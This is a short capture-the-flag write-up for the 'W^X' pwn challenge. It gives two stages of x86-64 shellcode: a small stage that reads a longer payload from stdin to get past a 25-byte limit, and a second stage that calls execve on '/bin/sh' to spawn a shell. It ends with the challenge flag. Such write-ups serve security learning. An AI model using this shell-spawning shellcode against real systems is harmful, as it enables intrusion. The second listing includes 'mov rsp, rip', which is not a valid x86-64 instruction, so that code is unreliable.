# W^X (pwn 484)

## Challenge
The challenge is a shellcoding challenge where memory writes have been hooked such that whenever memory is written to, whatever was written is immediately executed as code. The input attempts to limit the size of your shellcode to 25 bytes, so the solution is to just circumvent that by reading a longer shellcode from stdin.

```asm
xor rax, rax
xor rdi, rdi
lea rsi, [rip]
mov rdx, 0x100
syscall
```

The first payload is sent directly as hex and just reads up to 0x100 bytes from stdin.

```asm
mov rax, 59
mov rsp, rip
add rsp, 19
mov rdi, rsp
add rsp, 27
mov rsi, rsp
mov rdx, rsp
syscall
```
We send this payload along with the string "/bin/sh" after the end of the code.

The second payload is written directly as bytes and is longer shellcode that sets up registers for an execve syscall. The /bin/sh string is already in memory relative to the instruction pointer.

## Flag
X-MAS{7c4c67665ca44cd3f651bbb22631a41c}
